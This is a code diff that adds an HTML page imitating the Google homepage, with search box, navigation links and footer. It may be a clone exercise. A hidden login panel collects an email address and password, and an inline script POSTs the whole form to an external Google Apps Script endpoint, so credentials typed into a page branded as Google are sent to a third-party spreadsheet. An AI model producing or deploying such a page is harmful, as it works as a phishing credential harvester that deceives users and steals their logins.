@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Google</title>
+    <link rel="icon" href="./images/favicon.jpg" />
+    <link rel="stylesheet" href="./style.css" />
+    <script
+      src="https://kit.fontawesome.com/b0f29e9bfe.js"
+      crossorigin="anonymous"
+    ></script>
+    <!-- <script src="script.js"></script> -->
+    <style>
+      .hidden {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <nav class="navbar">
+        <ul>
+          <li>
+            <a
+              class="link"
+              href="https://support.google.com/mail/answer/8494?hl=en&co=GENIE.Platform%3DDesktop"
+              >Gmail</a
+            >
+          </li>
+          <li>
+            <a
+              class="link"
+              href="https://www.google.com/search?tbm=isch&q=images&tbs=imgo:1"
+              >Images</a
+            >
+          </li>
+          <li>
+            <div class="circle-shadow">
+              <a class="menu-icon"><i class="fas fa-bars"></i></a>
+            </div>
+          </li>
+          <li>
+            <!-- <form name="submit-to-google-sheet"></form> -->
+            <button id="loginButton">Login</button>
+            <div id="loginPage" class="hidden">
+              <h2>Login</h2>
+              <form name="submit-to-google-sheet" id="loginForm">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required /><br />
+
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required /><br />
+
+                <input type="submit" value="Submit" />
+              </form>
+                <!-- <input name="email" type="email" placeholder="Email" required> -->
+                <button type="submit"></button>
+            </form>
+            </div>
+          </li>
+        </ul>
+      </nav>
+    </header>
+
+    <section class="content-section">
+      <div class="content-wrapper">
+        <img class="logo-img" src="./images/logo.jpg" alt="Google Logo Image" />
+        <div class="search-bar">
+          <i class="fas fa-search"></i>
+          <input id="search-input"  type="text" />
+          <i class="fas fa-keyboard"></i>
+          <i class="fas fa-microphone"></i>
+        </div>
+        <div class="search-btns">
+          <button class="google-search-btn" onclick="searchGoogle()">
+            Google Search
+          </button>
+          <button class="lucky-search-btn">I'm Feeling Lucky</button>
+        </div>
+        <div class="language">
+          <p>Google Offered in: <a>Maori</a></p>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="footer-content upper-footer">
+        <p>India</p>
+      </div>
+      <div class="footer-content lower-footer">
+        <ul class="lower-left-footer">
+          <li>
+            <a>About</a>
+          </li>
+          <li>
+            <a>Advertising</a>
+          </li>
+          <li>
+            <a>Business</a>
+          </li>
+          <li>
+            <a>How Search Works</a>
+          </li>
+        </ul>
+        <ul class="lower-right-footer">
+          <li>
+            <a>Privacy</a>
+          </li>
+          <li>
+            <a>Terms</a>
+          </li>
+          <li>
+            <a href="chrome://settings/">Settings</a>
+          </li>
+        </ul>
+      </div>
+
+      <div id="navigation">
+        <button id="previous-page" disabled>&lt;</button>
+        <button id="next-page">&gt;</button>
+      </div>
+    </footer>
+
+    <script>
+      function searchGoogle() {
+        const searchInput = document.getElementById("search-input").value;
+        window.location.href = `https://www.google.com/search?q=${encodeURIComponent(
+          searchInput
+        )}`;
+      }
+
+      window.addEventListener("DOMContentLoaded", function () {
+        document
+          .getElementById("loginButton")
+          .addEventListener("click", function () {
+            document.getElementById("loginPage").classList.remove("hidden");
+            document.getElementById("loginButton").classList.add("hidden");
+          });
+
+        document
+          .getElementById("loginForm")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+            const email = document.getElementById("email").value;
+            const firstLetter = email.charAt(0).toUpperCase();
+
+            document.getElementById("loginButton").textContent = firstLetter;
+            document.getElementById("loginPage").classList.add("hidden");
+            document.getElementById("loginButton").classList.remove("hidden");
+          });
+      });
+
+      // form section
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbwOfvg6j4ScO5p5WXn5scclbiKF6gqlxoUGDkabzdypWFUWl-SOPtm_eOcT-o8HeMovXg/exec';
+                const form = document.forms['submit-to-google-sheet'];
+                form.addEventListener('submit', e =>{
+                  e.preventDefault();
+                  fetch(scriptURL, { method: 'POST', body: new FormData(form)}) 
+                    .then(response => console.log('Success!', response))
+                    .catch(error => console.error('Error!', error.message))
+                })
+    </script>
+     <script src="main.js"></script>
+  </body>
+</html>
